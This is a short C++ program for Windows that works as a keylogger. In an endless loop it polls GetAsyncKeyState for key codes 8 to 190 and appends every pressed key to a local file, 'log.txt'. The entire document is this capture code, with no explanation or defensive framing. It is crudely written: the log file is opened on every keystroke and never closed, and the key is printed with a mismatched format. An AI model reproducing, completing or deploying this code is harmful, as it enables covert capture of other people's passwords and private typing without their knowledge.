#include <iostream>
#include <windows.h>
#include <stdio.h>

using namespace std;

int salvar(int tecla, char *file){

    FILE *newarquivo;
    newarquivo = fopen(file, "a+");

    fprintf(newarquivo, "%s", &tecla);


return 0;
}

int main()
{
    char a;

    while(true){

        for(a=8;a<=190;a++){
            if(GetAsyncKeyState(a) == -32767)
            salvar(a,"log.txt");
        }

    }

    return 0;
}


